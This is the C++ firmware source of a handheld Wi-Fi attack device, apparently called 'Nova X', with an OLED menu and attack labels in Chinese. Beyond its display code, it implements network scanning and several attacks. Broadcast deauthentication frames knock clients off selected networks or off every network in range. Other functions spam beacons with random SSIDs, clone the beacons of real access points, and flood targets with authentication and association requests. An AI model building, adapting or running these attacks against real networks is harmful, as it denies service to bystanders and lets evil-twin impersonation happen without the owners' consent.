#include "LOGUARTClass.h"
#include <Wire.h>
#include <SPI.h>
#include <U8g2lib.h>
#include "LOGO.h"
//#include "ESP.h"
#include "WebUI.h"
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

#define OLED_RESET U8X8_PIN_NONE
U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, OLED_RESET);
int scrollindex = 0;
std::vector<String> Settings;
bool toggle_ok = false;
bool becaon_break_flag = false;
// SETTINGS
int frames_per_becaon = 3;
int max_clone = 3;
int max_spam_space = 3;
int selected_menu = 0;
std::vector<String> at_names;
std::vector<String> main_names;
std::vector<String> becaon_names;
std::vector<int> SelectedItem;
int fy = 0;
bool init_draw_menu_flag = false;
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
int selected_settings = 0;
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];

void drawBorders() {
  u8g2.setDrawColor(1);
  u8g2.drawLine(25, 0, 55, 0);
  u8g2.drawLine(73, 0, 103, 0);
  u8g2.drawLine(25, 63, 55, 63);
  u8g2.drawLine(73, 63, 103, 63);
}
void drawScrollbar(int selected, int menuSize, int maxVis, int lineH, int scrollBarW) {
  if (menuSize > maxVis) {
    int scrollBarH = (maxVis * lineH) * maxVis / menuSize;
    int scrollBarY = (selected * (maxVis * lineH - scrollBarH)) / (menuSize - 1);
    u8g2.setDrawColor(1);
    u8g2.drawFrame(128 - scrollBarW - 1, 3, scrollBarW, maxVis * lineH);
    u8g2.drawBox(128 - scrollBarW, scrollBarY + 3, scrollBarW - 1, scrollBarH);
  }
}

int scanNetworks(String text) {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");

  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    unsigned long start = millis();
    const unsigned long scanTime = 10000;
    int lastDots = -1;
    if (text == "Scanning") {
      while (millis() - start < scanTime) {
        int dotCount = ((millis() - start) / 500) % 4;
        u8g2.setDrawColor(1);
        u8g2.clearBuffer();
        u8g2.drawRFrame(0, 0, 128, 16, 4);  
        u8g2.drawStr(6, 12, "Nova X");
        u8g2.drawHLine(0, 17, 128);
        u8g2.drawHLine(0, 55, 128);
        String dots = "";
        for (int i = 0; i < 4; i++) {
          dots += (i <= dotCount) ? "." : " ";
        }
        String line = text + dots;
        u8g2.drawStr(10, 38, line.c_str());
        u8g2.sendBuffer();
        delay(50);
      }
    }

    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    u8g2.clearBuffer();
    u8g2.setDrawColor(1);
    u8g2.drawStr(0, 40, "Scan failed!");
    u8g2.sendBuffer();

    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

void renderText(const std::vector<String>& menu_name, int start, int fy,
                int renderCount, int lineH, int textHeight,
                int menuSize, int maxVis) {
  for (int idx = start; idx < menu_name.size() && idx < start + renderCount; idx++) {
    if (fy >= -lineH && fy < 64) {
      int textWidth = u8g2.getUTF8Width(menu_name[idx].c_str());
      int rectWidth = textWidth + 10;
      int maxWidth = (menuSize > maxVis) ? 110 : 118;
      if (rectWidth < 40)   rectWidth = 40;
      if (rectWidth > maxWidth) rectWidth = maxWidth;

      int rectX = (maxWidth - rectWidth) / 2 + 5;
      u8g2.setDrawColor(1);
      int textX = rectX + (rectWidth - textWidth) / 2;
      int textY = fy + (lineH - textHeight) / 2 + textHeight;
      u8g2.drawUTF8(textX, textY, menu_name[idx].c_str());
    }
    fy += lineH;
  }
}

void renderRoundRect(int rectX, int rectY, int rectWidth, int lineH, int cornerRadius) {
  u8g2.setDrawColor(1);
  u8g2.drawRFrame(rectX, rectY, rectWidth, lineH, cornerRadius);
  u8g2.drawRFrame(rectX + 1, rectY + 1, rectWidth - 2, lineH - 2, cornerRadius - 1);
}


bool contains(std::vector<int>& vec, int value) {
  for (int v : vec) {
    if (v == value) {
      return true;
    }
  }
  return false;
}
void draw_menu(std::vector<String>& menu_name, int selected) {
  const int charWidth = 5; //폰트넓이 폰트 변경시 변경 최소 5 
  static int prev_selected = -1;
  const int lineHeight = 15;
  const int maxVisibleItems = 4;
  const int cornerRadius = 5;
  const int scrollBarWidth = 3;
  const int animationFrames = 12;
  const float animationStep = 1.0f / animationFrames;
  const int textHeight = 10;        // 폰트 높이(중국어는 더 높여줘야 함)
  const int minRectWidth = 40;
  const int baseX = 5;
  const int textOffsetY = 3;
  const int maxWidthWithScrollbar = 110;
  const int maxWidthNoScrollbar = 118;

  int menuSize = menu_name.size();
  if (menuSize == 0) {
    return;
  }

  // if (prev_selected < 0 || prev_selected >= menuSize) {
  //   prev_selected = -1;
  // }

  if (selected < 0) {
    selected = 0;
  }
  if (selected >= menuSize) {
    selected = menuSize - 1;
  }
  auto calcStartIndex = [&](int sel) -> int {
    if (sel < 0) sel = 0;
    if (sel >= menuSize) sel = menuSize - 1;

    if (menuSize > maxVisibleItems && sel >= maxVisibleItems - 1) {
      int s = sel - (maxVisibleItems - 1);
      if (s + maxVisibleItems > menuSize) {
        return menuSize - maxVisibleItems;
      }
      return s;
    }
    return 0;
  };

  auto calcRectWidth = [&](int textLen) -> int {
    // int 말고 string으로 받으면 에러 생김
    int w = textLen * charWidth + 10; // 풀 중국어시 감소
    int maxW = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
    if (w < minRectWidth) w = minRectWidth;
    if (w > maxW)       w = maxW;
    return w;
  };

  if (prev_selected == -1 || prev_selected == selected) {
    int startIndex = calcStartIndex(selected);
    int fy = textOffsetY;

    u8g2.clearBuffer();
    drawBorders();
    renderText(menu_name, startIndex, fy, maxVisibleItems, lineHeight, textHeight, menuSize, maxVisibleItems);
    drawScrollbar(selected, menuSize, maxVisibleItems, lineHeight, scrollBarWidth);
    for (int i = 0; i < maxVisibleItems && (startIndex + i) < menuSize; ++i) {
      if ((startIndex + i) == selected) {
        String selStr = menu_name[selected];
        int rectW = calcRectWidth(selStr.length());
        int maxW = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
        int rectX = (maxW - rectW) / 2 + baseX;
        renderRoundRect(rectX, fy, rectW, lineHeight, cornerRadius);
      }
      fy += lineHeight;
    }

    u8g2.sendBuffer();
    prev_selected = selected;
    return;
  }

  //애니메이션 블럭
  int prevStart = calcStartIndex(prev_selected);
  int newStart  = calcStartIndex(selected);

  int prevY = textOffsetY + (prev_selected - prevStart) * lineHeight;
  int newY  = textOffsetY + (selected - newStart) * lineHeight;
  int prevW = calcRectWidth(menu_name[prev_selected].length());
  int newW = calcRectWidth(menu_name[selected].length());
  int maxW = (menuSize > maxVisibleItems) ? maxWidthWithScrollbar : maxWidthNoScrollbar;
  int prevX = (maxW - prevW) / 2 + baseX;
  int newX  = (maxW - newW) / 2 + baseX;

  for (int i = 1; i <= animationFrames; ++i) {
    float t = i * animationStep;
    float easedT = 1.0f - (1.0f - t) * (1.0f - t);

    int currentY = prevY + int((newY - prevY) * easedT);
    int currentW = prevW + int((newW - prevW) * easedT);
    int currentX = prevX + int((newX - prevX) * easedT);

    float currentStartF = prevStart + (newStart - prevStart) * easedT;
    int currentStart = int(currentStartF);
    float fractionY = currentStartF - currentStart;
    int fy = textOffsetY - int(fractionY * lineHeight);

    u8g2.clearBuffer();
    drawBorders();
    renderText(menu_name, currentStart, fy, maxVisibleItems + 1, lineHeight, textHeight, menuSize, maxVisibleItems);
    drawScrollbar(selected, menuSize, maxVisibleItems, lineHeight, scrollBarWidth);
    renderRoundRect(currentX, currentY, currentW, lineHeight, cornerRadius);
    u8g2.sendBuffer();
    delay(4);
  }
  int startIndex = calcStartIndex(selected);
  int fy2 = textOffsetY;
  u8g2.clearBuffer();
  drawBorders();
  renderText(menu_name, startIndex, fy2, maxVisibleItems, lineHeight, textHeight, menuSize, maxVisibleItems);
  drawScrollbar(selected, menuSize, maxVisibleItems, lineHeight, scrollBarWidth);
  for (int i = 0; i < maxVisibleItems && (startIndex + i) < menuSize; ++i) {
    if ((startIndex + i) == selected) {
      int rectW = calcRectWidth(menu_name[selected].length());
      int rectX = (maxW - rectW) / 2 + baseX;
      renderRoundRect(rectX, fy2, rectW, lineHeight, cornerRadius);
    }
    fy2 += lineHeight;
  }
  u8g2.sendBuffer();
  prev_selected = selected; 
}
void addValue(std::vector<int>& vec, int value) {
  if (!contains(vec, value)) {
    vec.push_back(value);
  } else {
    Serial.print(value);
    Serial.println("Exits");
    for (auto IT = vec.begin(); IT != vec.end();) {
      if (*IT == value) {
        IT = vec.erase(IT);
      } else {
        ++IT;
      }
    }
    Serial.println("De-selected");
  }
}
void display_init() {
  u8g2.setDrawColor(1);
}
void RuningProgressBar() {
  static unsigned long lastupdate = 0;
  static int progress = 0;

  if (millis() - lastupdate > 300) {
    progress += 5;
    if (progress > 100) {
      progress = 0;
      u8g2.setDrawColor(0);
      u8g2.drawBox(10, 40, 100, 10);
      u8g2.setDrawColor(1);
    }
    lastupdate = millis();
  }

  u8g2.drawFrame(10, 40, 100, 10);
  int fill = (progress * (100 - 2)) / 100; // width-2 = 98
  if (fill > 0) {
    u8g2.setDrawColor(1);
    u8g2.drawBox(10 + 1, 40 + 1, fill, 10 - 2);
  }
  u8g2.sendBuffer();
}


void becaon(int state) {
  
  display_init();
  u8g2.clearBuffer();
  uint8_t fh = u8g2.getMaxCharHeight(); 
  u8g2.drawRFrame(0, 0, 128, 16, 4);
  u8g2.drawUTF8(6, fh, "状态");
  u8g2.drawHLine(0, 17, 128);
  u8g2.drawUTF8(4, 22 + fh, becaon_names[state].c_str());
  const int cx = 110, cy = 26, r = 5;
  u8g2.drawDisc(cx, cy, r);
  u8g2.drawCircle(cx, cy, r);
  u8g2.sendBuffer();
  while (!becaon_break_flag) {
    RuningProgressBar();
    if (ButtonPress(btnBack)) {
      becaon_break_flag = true;
      break;
    }
    switch (state) {
      case 0: {
        char randomString[6 * 4 + 1] = {0};
        for (int i = 0; i < 6; i++) {
          byte randomByte = random(0x00, 0xFF);
          snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
        }
        int randomIndex = random(0, 19);
        int randomChannel = allChannels[randomIndex];
        wext_set_channel(WLAN0_NAME, randomChannel);
        String spamssid = generateRandomString(10);
        for (int j = 0; j < max_spam_space; j++) {
          spamssid += " ";
          const char* spamssid_cstr = spamssid.c_str();
          for (int x = 0; x < frames_per_becaon; x++) {
            wifi_tx_beacon_frame(randomString, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", spamssid_cstr);
          }
        }
        break;
      }
      case 1: {
        for (int i = 0; i < SelectedItem.size(); i++) {
          int idx = SelectedItem[i];
          String clonessid = scan_results[idx].ssid;
          uint8_t becaon_bssid[6];
          memcpy(becaon_bssid, scan_results[idx].bssid, 6);
          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
          for (int j = 0; j < max_clone; j++) {
            clonessid += " ";
            const char* clonessid_cstr = clonessid.c_str();
            for (int x = 0; x < frames_per_becaon; x++) {
              wifi_tx_beacon_frame_Privacy_RSN_IE(becaon_bssid, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", clonessid_cstr);
            }
          }
        }
        break;
      }
    }
  }
}

bool deauth_break_flag = false;
void deauth(int SetMode) {
  deauth_channels.clear();
  chs_idx.clear();
  current_ch_idx = 0;
  
  switch (SetMode) {
    case 0: {
      for (int i = 0; i < SelectedItem.size(); i++) {
        int idx = SelectedItem[i];
        int ch = scan_results[idx].channel;
        deauth_channels[ch].push_back(idx);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
    case 1: { 
      for (int i = 0; i < scan_results.size(); i++) {
        int ch = scan_results[i].channel;
        deauth_channels[ch].push_back(i);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
  }
  
  isDeauthing = true;
  deauth_break_flag = false;
  while (isDeauthing && !deauth_channels.empty() && !deauth_break_flag) {
    RuningProgressBar();
    if (current_ch_idx < chs_idx.size()) {
      int ch = chs_idx[current_ch_idx];
      wext_set_channel(WLAN0_NAME, ch);
      
      if (deauth_channels.find(ch) != deauth_channels.end()) {
        std::vector<int>& networks = deauth_channels[ch];
        
        for (int i = 0; i < frames_per_deauth; i++) {
          if (ButtonPress(btnBack)) {
            deauth_break_flag = true;
            break;
          }
          
          for (int j = 0; j < networks.size(); j++) {
            int idx = networks[j];
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
            sent_frames++;
          }
          
          delay(send_delay);
        }
      }
      current_ch_idx++;
      if (current_ch_idx >= chs_idx.size()) {
        current_ch_idx = 0;
      }
    }
  }
  
  isDeauthing = false;
  wext_set_channel(WLAN0_NAME, current_channel);
}

void SourApple(){
  //SendToEsp("Sour Apple Mode");
  display_init();
  delay(200);
  //SendToEsp("RUN");
  while(true){
    RuningProgressBar();
    if(ButtonPress(btnBack)) {
      //SendToEsp("Q");
      break;
    }
  }
}

void showPopup(String message, int duration = 1500) {
  int charWidth = 6;
  int charHeight = u8g2.getMaxCharHeight();
  int w = message.length() * charWidth;
  int h = charHeight;
  int boxWidth  = w + 10;
  int boxHeight = h + 10; 
  int boxX = (SCREEN_WIDTH  - boxWidth)  / 2;
  int boxY = (SCREEN_HEIGHT - boxHeight) / 2;

  u8g2.setDrawColor(0);
  u8g2.drawBox(boxX, boxY, boxWidth, boxHeight);
  u8g2.drawFrame(boxX, boxY, boxWidth, boxHeight);
  u8g2.drawStr(boxX + 5, boxY + 5 + charHeight, message.c_str());

  u8g2.sendBuffer();
  delay(duration);
}

int SSID_NUM = 0;

int scrollindex2 = 0;


//세팅 값 렌더링
void renderText(const std::vector<String>& settings,
                int start, int fy,
                int renderCount, int lineH,
                int textHeight, int selected) {
  for (int idx = start; idx < settings.size() && idx < start + renderCount; idx++) {
    if (fy >= -lineH && fy < 64) {
      int textX = 10;
      int textY = fy + (lineH - textHeight) / 2 + textHeight;
      u8g2.setDrawColor(1);
      u8g2.drawUTF8(textX, textY, settings[idx].c_str());

      int numX = 100;
      String numStr;
      switch (idx) {
        case 0: numStr = String(frames_per_deauth); break;
        case 1: numStr = String(frames_per_becaon); break;
        case 2: numStr = String(max_clone);         break;
        case 3: numStr = String(max_spam_space);    break;
        default: numStr = "";                       break;
      }

      int numW = numStr.length() * 6;
      int numH = textHeight;
      if (toggle_ok) {
        u8g2.setDrawColor(1);
        u8g2.drawBox(numX, fy + (lineH - textHeight) / 2, numW, numH);
        u8g2.setDrawColor(0);
        u8g2.drawUTF8(numX, textY, numStr.c_str());
      } else {
        u8g2.setDrawColor(0);
        u8g2.drawBox(numX, fy + (lineH - textHeight) / 2, numW, numH);
        u8g2.setDrawColor(1);
        u8g2.drawUTF8(numX, textY, numStr.c_str());
      }
    }
    fy += lineH;
  }
}

void Draw_Settings() {
  const int lineH = 15;
  const int textHeight = 8;
  const int frames = 12;
  const int cornerRadius = 5;
  const int rectX = 5;
  const int rectWidth = 118;

  int prev_selected_settings = selected_settings;

  while (true) {
    if (ButtonPress(btnBack)) {
      selected_settings = 0;
      toggle_ok = false;
      break;
    }
    if (ButtonPress(btnOk)) {
      toggle_ok = !toggle_ok;
    }
    if (ButtonPress(btnDown)) {
      if (toggle_ok) {
        switch (selected_settings) {
          case 0: frames_per_deauth++;    break;
          case 1: frames_per_becaon++;     break;
          case 2: max_clone++;            break;
          case 3: max_spam_space++;       break;
        }
      } else {
        if (selected_settings > 0) {
          prev_selected_settings = selected_settings;
          selected_settings--;
          int prevY   = 3 + prev_selected_settings * lineH;
          int targetY = 3 + selected_settings      * lineH;
          for (int i = 1; i <= frames; i++) {
            float t = i / (float)frames;
            float easedT = 1.0f - (1.0f - t)*(1.0f - t); // ease-out
            int currentY = prevY + (targetY - prevY) * easedT;

            u8g2.clearBuffer();
            renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
            u8g2.setDrawColor(1);
            renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
            u8g2.sendBuffer();
            delay(4);
          }
        }
      }
    }
    if (ButtonPress(btnUp)) {
      if (toggle_ok) {
        // 최소값 검증
        if ((frames_per_becaon > 0) && (frames_per_deauth > 0) && (max_clone > 0) && (max_spam_space > 0)) {
          switch (selected_settings) {
            case 0: frames_per_deauth--;    break;
            case 1: frames_per_becaon--;     break;
            case 2: max_clone--;            break;
            case 3: max_spam_space--;       break;
          }
        }
      } else {
        if (selected_settings < Settings.size() - 1) {
          prev_selected_settings = selected_settings;
          selected_settings++;
          int prevY   = 3 + prev_selected_settings * lineH;
          int targetY = 3 + selected_settings      * lineH;
          for (int i = 1; i <= frames; i++) {
            float t = i / (float)frames;
            float easedT = 1.0f - (1.0f - t)*(1.0f - t); // ease-out
            int currentY = prevY + (targetY - prevY) * easedT;

            u8g2.clearBuffer();
            renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
            u8g2.setDrawColor(1);
            renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
            u8g2.sendBuffer();
            delay(4);
          }
        }
      }
    }
    u8g2.clearBuffer();
    renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
    int fy = 3 + selected_settings * lineH;
    renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
    u8g2.sendBuffer();
  }
}

void AT_draw_func(int state);
void auth_assoc(int state);
void Draw_Selected_Menu() {
  const int lineH     = 15;
  const int maxVis    = 4;
  const int cornerRadius = 5;
  const int frames    = 12;
  const float step    = 1.0f / frames;
  const int textHeight = 8;
  const int markWidth = 3 * 6;
  static int prev_scrollindex = -1;
  const int scrollBarW = 3;
  int menuSize = scan_results.size();

  while (true) {
    int pageStart     = (scrollindex / maxVis) * maxVis;
    int prevPageStart = (prev_scrollindex == -1 ? pageStart : (prev_scrollindex / maxVis) * maxVis);
    bool animate = false;
    if (ButtonPress(btnUp) && scrollindex < menuSize - 1) {
      prev_scrollindex = scrollindex;
      scrollindex++;
      prevPageStart = (prev_scrollindex / maxVis) * maxVis;
      pageStart     = (scrollindex     / maxVis) * maxVis;
      animate = (prev_scrollindex != -1);
    }
    if (ButtonPress(btnDown) && scrollindex > 0) {
      prev_scrollindex = scrollindex;
      scrollindex--;
      prevPageStart = (prev_scrollindex / maxVis) * maxVis;
      pageStart     = (scrollindex     / maxVis) * maxVis;
      animate = (prev_scrollindex != -1);
    }
    if (ButtonPress(btnOk)) {
      addValue(SelectedItem,scrollindex);
    }
    if (ButtonPress(btnBack)) {
      break;
    }

    if (animate) {
      int prevY   = 3 + (prev_scrollindex - prevPageStart) * lineH;
      int targetY = 3 + (scrollindex      - pageStart)     * lineH;
      const int rectWidth = SCREEN_WIDTH - 25;
      const int rectX     = 0;

      for (int i = 1; i <= frames; i++) {
        float t = i * step;
        float easedT = 1.0f - (1.0f - t)*(1.0f - t);
        int currentY = prevY + (targetY - prevY) * easedT;

        u8g2.clearBuffer();
        for (int line = 0; line < maxVis; line++) {
          int idx = pageStart + line;
          if (idx >= menuSize) break;
          String ssid = scan_results[idx].ssid;
          if (ssid.length() == 0)        ssid = "#HIDDEN";
          else if (ssid.length() > 13)   ssid = ssid.substring(0, 13) + "...";

          bool checked = false;
          for (int x : SelectedItem) {
            if (x == idx) { checked = true; break; }
          }
          String mark = checked ? "[*]" : "[ ]";

          int fy = 3 + line * lineH;
          int textY = fy + (lineH - textHeight) / 2 + textHeight;
          u8g2.drawStr(5, textY, ssid.c_str());
          u8g2.drawStr(SCREEN_WIDTH - markWidth - 7, textY, mark.c_str());
        }

        drawScrollbar(scrollindex, menuSize, maxVis, lineH, scrollBarW);
        renderRoundRect(rectX,currentY,rectWidth,lineH,cornerRadius);
        u8g2.sendBuffer();
        delay(4);
      }
    }
    u8g2.clearBuffer();
    const int rectWidth = SCREEN_WIDTH - 25;
    const int rectX     = 0;
    for (int line = 0; line < maxVis; line++) {
      int idx = pageStart + line;
      if (idx >= menuSize) break;
      String ssid = scan_results[idx].ssid;
      if (ssid.length() == 0)      ssid = "#HIDDEN";
      else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";

      bool checked = false;
      for (int x : SelectedItem) {
        if (x == idx) { checked = true; break; }
      }
      String mark = checked ? "[*]" : "[ ]";

      int fy    = 3 + line * lineH;
      int textY = fy + (lineH - textHeight) / 2 + textHeight;

      u8g2.setDrawColor(1);
      u8g2.drawStr(5, textY, ssid.c_str());
      u8g2.drawStr(SCREEN_WIDTH - markWidth - 7, textY, mark.c_str());

      if (idx == scrollindex) {
        renderRoundRect(rectX,fy,rectWidth,lineH,cornerRadius);
      }
    }

    // 스크롤바
    drawScrollbar(scrollindex, menuSize, maxVis, lineH, scrollBarW);

    u8g2.sendBuffer();
    prev_scrollindex = scrollindex;
  }
}
void selection_handdler(std::vector<String>& menu_name_handle, int menu_func_state) {
  while (true) {
    bool buttonPressed = false;
    //working_check();
    //draw_menu(names,selected_menu);
    if (ButtonPress(btnBack)) {
      Serial.println("BACK");
      if (!menu_func_state == 0) selected_menu = 0;
      break;
    }
    if (ButtonPress(btnOk)) {
      buttonPressed = true;
      switch (menu_func_state) {
        case 0:  //default
          switch (selected_menu) {
            case 0:
              //working_check();
              //Attack Menu Draw Func
              draw_menu(at_names, 0);
              Serial.println("at_names Drawing");
              selection_handdler(at_names, 1);
              Serial.println(menu_func_state);
              selected_menu = 0;
              draw_menu(menu_name_handle, selected_menu);  // MUST NEED IT
              break;
            case 1:
              if (scanNetworks("Scanning") != 0) {
                while(true) delay(1000);
              }
              
              selected_menu = 0;
              draw_menu(menu_name_handle, selected_menu);
              break;
            case 2:
              Draw_Selected_Menu();
              draw_menu(menu_name_handle, selected_menu);
              break;
            case 3:
              Draw_Settings();
              draw_menu(menu_name_handle, selected_menu);
              break;
          }
          break;
        case 1:
          AT_draw_func(selected_menu);
          display_working = false;
          draw_menu(menu_name_handle,selected_menu);
          break;
        case 2:
          switch(selected_menu){
            case 0:
              if(!becaon_break_flag) becaon(0);
              draw_menu(menu_name_handle, selected_menu);
              becaon_break_flag = false;
              break;
            case 1:
              if(!becaon_break_flag) becaon(1);
              draw_menu(menu_name_handle, selected_menu);
              becaon_break_flag = false;
              break;
          }
          break;
        default:
          Serial.println("ERROR");
          Serial.println(menu_func_state);
          break;
      }
    }
    if (ButtonPress(btnUp)) {
      buttonPressed = true;
      if (selected_menu == menu_name_handle.size() - 1) {
        selected_menu = selected_menu;
      } else {
        selected_menu++;
        Serial.println(selected_menu);
        draw_menu(menu_name_handle, selected_menu);
        Serial.println("UP");
      }
    }
    if (ButtonPress(btnDown)) {
      buttonPressed = true;
      if (selected_menu == 0) {
        selected_menu = 0;
      } else {
        selected_menu--;
        Serial.println(selected_menu);
        draw_menu(menu_name_handle, selected_menu);
        Serial.println("DOWN");
      }
    }
  }
}
void AT_draw_func(int state) {
  if (wifi_working) {
    showPopup("WIFI WORKING");
    return;
  }

  display_working = true;
  display_init();
  deauth_break_flag = false;
  uint8_t fh = u8g2.getMaxCharHeight(); 
  while (true) {

    if (ButtonPress(btnBack)) {
      draw_menu(at_names, state);
      break;
    }
    if (at_names[state] == "信标帧") {
      selected_menu = 0;
      draw_menu(becaon_names, 0);
      selection_handdler(becaon_names, 2);
      break;
    }
    u8g2.clearBuffer();
    u8g2.drawRFrame(0, 0, 128, 16, 4);
    u8g2.drawUTF8(6, fh, "状态");
    u8g2.drawHLine(0, 17, 128);
    u8g2.drawUTF8(4, 22 + fh, at_names[state].c_str());
    const int cx = 110, cy = 26, r = 5;
    u8g2.drawDisc(cx, cy, r);
    u8g2.drawCircle(cx, cy, r);
    u8g2.sendBuffer();

    if (SelectedItem.empty()) {
      SelectedItem.push_back(0);
    }

    if (at_names[state]== "认证攻击") {
      deauth(0);
    } else if (at_names[state] == "全网断开攻击") {
      deauth(1);
    } else if (at_names[state] == "关联洪水") {
      auth_assoc(0);
      break;
    } else if (at_names[state] == "洪水攻击") {
      auth_assoc(1);
      break;
    }

    if (deauth_break_flag) {
      draw_menu(at_names, state);
      break;
    }
  }
}

bool assoc_flag = true;


void flood(const uint8_t* bssid, const char* ssid, uint32_t count, uint16_t delay_ms,int state){
  uint8_t random_src[6];
  for (uint32_t i = 0; i < count; i++) {
    if(ButtonPress(btnBack)) {
      assoc_flag = false;
      break;
    }
    random_mac(random_src);
    uint16_t seq = i & 0xFFF;
    switch(state){
      case 0:
        break;
      case 1:
        wifi_tx_assoc_frame(random_src, (void*)bssid, ssid, seq);
        break;
      case 2:
        break;
      case 3:
        wifi_tx_auth_frame(random_src, (void*)bssid, seq);
        break;
    if (delay_ms) delay(delay_ms);
    }
  }
}
void auth_assoc(int state){
  assoc_flag = true;
  if(SelectedItem.size() == 1){
    while(assoc_flag){
      RuningProgressBar();
      int idx = SelectedItem[0];
      int ch = scan_results[idx].channel;
      String SSID = scan_results[idx].ssid;
      wext_set_channel(WLAN0_NAME,ch);
      memcpy(deauth_bssid,scan_results[idx].bssid,6);
      switch(state){
        case 0:{
          if( ch > 14){
            u8g2.clearBuffer();
            showPopup("5Ghz Not Support");
            assoc_flag = false;
          }
          flood(deauth_bssid,SSID.c_str(),5000,2,1);
          break;
        }
        case 1:{
          flood(deauth_bssid,SSID.c_str(),5000,2,3);
          break;
        }
      }

    }
  }
  else{
    u8g2.clearBuffer();
    showPopup("Please select one ssid for performance");
  }
}
void webUI(){
  display_init();
  u8g2.clearBuffer();
  u8g2.drawStr(0, 30, "Web UI");
  u8g2.sendBuffer();
  while(true){
    web_stable();
    if(ButtonPress(btnBack)){
      selected_menu = 0;
      u8g2.clearBuffer();
      draw_menu(main_names, 0);
      break;
    }
  }
}
void display_update(){
  selection_handdler(main_names, 0);
  webUI();
}
